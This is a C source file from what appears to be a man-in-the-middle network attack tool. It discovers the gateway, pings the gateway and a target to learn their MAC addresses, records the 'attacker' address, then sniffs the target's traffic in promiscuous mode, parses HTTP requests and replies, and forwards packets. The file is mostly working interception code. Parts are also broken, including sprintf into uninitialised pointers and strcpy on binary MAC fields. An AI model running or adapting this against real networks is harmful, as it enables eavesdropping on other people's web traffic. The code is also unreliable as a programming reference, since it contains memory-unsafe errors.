#include"sniffer.h"
extern bool debug; 
extern bool manual;
//	bool debug;
#define BUFSIZE 8192

pcap_t* handle;

struct route_info{
	u_int dstAddr;
	u_int srcAddr;
	u_int gateWay;
	char ifName[IF_NAMESIZE];
};

void spilt(char* str,char* delim,char* ip ,int ip_len){
        char* str_t = strdup(str);

        *ip++ = atoi(strtok(str_t,delim));

        for(int i=0; i<ip_len-1; i++ ){
                *ip++ = atoi((strtok(NULL,delim)));

        }
        free(str_t);
}

void getGatewayMAC(u_char* arg,const struct pcap_pkthdr* hp, const u_char* packet){
	sni_info* sni = (sni_info*)arg;
	ethernet_header* eth_header = (ethernet_header*)packet;
	strcpy(sni->gateway_mac,eth_header->SRC_mac);
}

void getTargetMAC(u_char* arg,const struct pcap_pkthdr* hp,const u_char* packet){
	sni_info* sni = (sni_info*)arg;
	ethernet_header* eth_header = (ethernet_header*)packet;
	strcpy(sni->target_mac,eth_header->SRC_mac);
}

int readNlSock(int sockfd,char* buf,int seqNum,int pid){
	struct nlmsghdr* nlHdr;
	int readLen = 0, msgLen = 0;

	do{
		readLen = recv(sockfd,buf,BUFSIZE - msgLen,0);
		nlHdr = (struct nlmsghdr *)buf;
		if(nlHdr->nlmsg_type == NLMSG_DONE){
			break;
		}

		buf += readLen;
		msgLen += readLen;

		if((nlHdr->nlmsg_flags & NLM_F_MULTI) == 0){
			break;
		}
	}
	while((nlHdr->nlmsg_seq != seqNum) || (nlHdr->nlmsg_pid != pid));
	return msgLen;
}
void parseRoutes(struct nlmsghdr* nlHdr,struct route_info *rtInfo,char* gateway){
	struct rtmsg* rtMsg;
	struct rtattr* rtAttr;
	int rtLen;
	char tempBuf[100];
	struct in_addr dst;
	struct in_addr gate;

	rtMsg = (struct rtmsg*)NLMSG_DATA(nlHdr);
	if((rtMsg->rtm_family != AF_INET) || (rtMsg->rtm_table != RT_TABLE_MAIN))
		return;
	rtAttr = (struct rtattr*)RTM_RTA(rtMsg);
	rtLen = RTM_PAYLOAD(nlHdr);
	for(;RTA_OK(rtAttr,rtLen);rtAttr = RTA_NEXT(rtAttr,rtLen)){
		switch(rtAttr->rta_type){
			case RTA_OIF:
				if_indextoname(*(int*)RTA_DATA(rtAttr),rtInfo->ifName);
			break;
			case RTA_GATEWAY:
				rtInfo->gateWay = *(u_int*)RTA_DATA(rtAttr);
			break;
			case RTA_PREFSRC:
				rtInfo->srcAddr = *(u_int*)RTA_DATA(rtAttr);
			break;
			case RTA_DST:
				rtInfo->dstAddr = *(u_int*)RTA_DATA(rtAttr);
			break;
		}
	}
	dst.s_addr = rtInfo->dstAddr;
	if(strstr((char*)inet_ntoa(dst),"0.0.0.0")){
		gate.s_addr = rtInfo->gateWay;
		spilt((char*)inet_ntoa(gate),".",gateway,4);
	}
	return;
}

int getGatewayIP(u_char* gateway){
	struct nlmsghdr *nlMsg;
	struct rtmsg *rtMsg;
	struct route_info* rtInfo;
	char msgBuf[BUFSIZE];

	int sockfd, len, msgSeq = 0;
	if((sockfd = socket(PF_NETLINK,SOCK_DGRAM,NETLINK_ROUTE))<0){
		perror("Socket Creation: ");
		return -1;
	}

	memset(msgBuf, 0, BUFSIZE);

	nlMsg = (struct nlmsghdr*)msgBuf;
	rtMsg = (struct rtmsg*)NLMSG_DATA(nlMsg);

	nlMsg->nlmsg_len = NLMSG_LENGTH(sizeof(struct rtmsg));
	nlMsg->nlmsg_type = RTM_GETROUTE;

	nlMsg->nlmsg_flags = NLM_F_DUMP | NLM_F_REQUEST;
	nlMsg->nlmsg_seq = msgSeq++;
	nlMsg->nlmsg_pid = getpid();

	if(send(sockfd,nlMsg,nlMsg->nlmsg_len,0)<0){
		if(debug){
			printf("Write to Socket Failed....\n");
		}
	}
	if((len = readNlSock(sockfd,msgBuf,msgSeq,getpid()))<0){
		if(debug){
			printf("Read From Socket Failed.....\n");
		}
	}
	rtInfo = (struct route_info*)malloc(sizeof(struct route_info));
	for(;NLMSG_OK((struct nlmsghdr*)msgBuf,len);
			nlMsg = NLMSG_NEXT((struct nlmsghdr*)msgBuf,len)){
		memset(rtInfo, 0, sizeof(struct route_info));
		parseRoutes(nlMsg,rtInfo,gateway);
	}
	free(rtInfo);
	close(sockfd);
	return 0;
}

void shutdown_pcap(){
	pcap_breakloop(handle);
}

int sniffer_init(sni_info* info,char* errbuf){
	struct in_addr addr_net;
	u_int tmp_mask;
	u_int tmp_net_addr;
	if(pcap_lookupnet(info->dev,&tmp_net_addr,&tmp_mask,errbuf)==-1)return FAIL;
	addr_net.s_addr = tmp_mask;
	info->mask = inet_ntoa(addr_net);
	addr_net.s_addr = tmp_net_addr;
	if(!manual){
		info->handle = pcap_open_live(info->dev,65536,0,100,errbuf);  //no promiscous mode,or can't get the gateway mac
		if(!info->handle){
			printf("%s\n",errbuf);
			return -1;
		}
		strcpy(info->filter_app,"icmp[icmptype] = icmp-echoreply");
		if(pcap_compile(info->handle,&info->filter,info->filter_app,0,tmp_mask)){
			if(debug)printf("%s\n",pcap_geterr(info->handle));
			return -1;
		}
		pcap_setfilter(info->handle,&(info->filter));
		handle = info->handle;
		alarm(2);
		signal(SIGALRM,shutdown_pcap);
		getGatewayIP(info->gateway_ip);
		char* gatewayIp;
		sprintf(gatewayIp,"%d.%d.%d.%d",info->gateway_ip[0],info->gateway_ip[1],
						info->gateway_ip[2],info->gateway_ip[3]);
		ping(gatewayIp);
		if(pcap_dispatch(info->handle,1,getGatewayMAC,(u_char*)info)<0){
			ping("8.8.8.8");
			if(pcap_dispatch(info->handle,1,getGatewayMAC,(u_char*)info)<0){
			       	return 12;
			}else{
				alarm(0);
			}
		}else{
			alarm(0);
		}
		getAttackerInfo(info->dev,info->attacker_mac,info->attacker_ip);
		char* target;
		sprintf(target,"%d.%d.%d.%d",info->target_ip[0],info->target_ip[1],
						info->target_ip[2],info->target_ip[3]);
		alarm(1);
		ping(target);
		if(pcap_dispatch(info->handle,1,getTargetMAC,(u_char*)info)<0){
			return 13;
		}else{
			alarm(0);
		}
		if(debug){
			printf("=========================================\n");
			printf("the gateway's mac is ");
			println_mac(info->gateway_mac);
			printf("the gateway's ip is ");
			println_ip(info->gateway_ip);
			printf("=========================================\n");
			printf("the attacker's mac is ");
			println_mac(info->attacker_mac);
			printf("the attacker's ip is ");
			println_ip(info->attacker_ip);
			printf("=========================================\n");
			printf("the target's mac is ");
			println_mac(info->target_mac);
			printf("the target's ip is ");
			println_ip(info->target_ip);
		}
	}

	info->handle = pcap_open_live(info->dev,65536,1,100,errbuf); // set to promiscous mode to get packet
	return 0;
}

void anylysis_packet(u_char* user,const struct pcap_pkthdr* hp ,const u_char* packet){
	MITM_info* info = (MITM_info*)user;
	int header_len;
	ethernet_header* pEther = (ethernet_header*) packet;
	header_len = sizeof(ethernet_header);
	switch(ntohs(pEther->eth_type)){
		case EPT_IPv4 :;
			ip_header* pIpv4 = (ip_header*) (packet+header_len);
			header_len += sizeof(ip_header);
			tcp_header* pTcp;
			switch (pIpv4->protocol_type){
				case PROTOCOL_ICMP :
				break;
				case PROTOCOL_TCP : ;
					tcp_header* pTcp = (tcp_header*) (packet + header_len);
		       			header_len += ((pTcp->header_len_flag)>>12)*4; 
					//the length of tcp header is not fix,if option flag is setup,
					//the length of header can be maximun 40 bytes
					switch(pTcp->dest_port) {
						case 80 :;
							http_resquest_payload payload;
							parse_http_request(packet+header_len,&payload);
						break;
					}
					switch(pTcp->sour_port) {
						case 80 :;
							 http_reply_payload payload;
							 parse_http_reply(packet+header_len,&payload);
					}
				break;
				case PROTOCOL_UDP : ;
					udp_header* pUdp = (udp_header*) (packet + header_len);
					header_len += sizeof(udp_header);
				break;	
			}
			print_ip(pIpv4->src_ip);
			printf(" >> ");
			print_ip(pIpv4->dest_ip);
			printf("  ");
			print_protocol(pIpv4->protocol_type);
			printf("\n");
		break;
		case EPT_ARP :;
			arp_header* pArp = (arp_header*)(packet + header_len);
			switch(ntohs(pArp -> option)){
				case ARP_REQURST :
					printf("who was ");
					print_ip(pArp->dest_mac);
					printf(" talk to ");
					println_ip(pArp->src_ip);
				break;
				case ARP_REPLY : 
					print_mac(pArp->src_mac);
					printf(" is ");
					println_ip(pArp->src_ip);
			}
		break;
	}
	
	forword(info->dev,ntohs(pEther->eth_type),pEther->DST_mac,pEther->SRC_mac,
			packet+sizeof(ethernet_header),hp->len-sizeof(ethernet_header));	
}

void* capute(void* mitm_info){
	if(debug){
		printf("=======capute pcaket come from target=======\n");
	}
	pcap_t* handle;
	MITM_info* info = (MITM_info*)mitm_info;
	struct bpf_program bpf;
	u_int netNum;
	u_int netmask;
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_lookupnet(info->dev,&netNum,&netmask,errbuf);
	handle = pcap_open_live(info->dev,65536,1,1000,errbuf);
	if(!handle){
		printf("error : %s\n",errbuf);
		return NULL;
	}

	if(pcap_compile(handle,&bpf,info->filter,0,netmask)){
		if(debug){
			printf("error : %s\n",pcap_geterr(handle));
		}
		return NULL;
	}
	if(pcap_setfilter(handle,&bpf)<0){
		if(debug){
			printf("error : %s\n",pcap_geterr(handle));
		}
		return NULL;
	}
	pcap_loop(handle,-1,anylysis_packet,(u_char*)info);
}
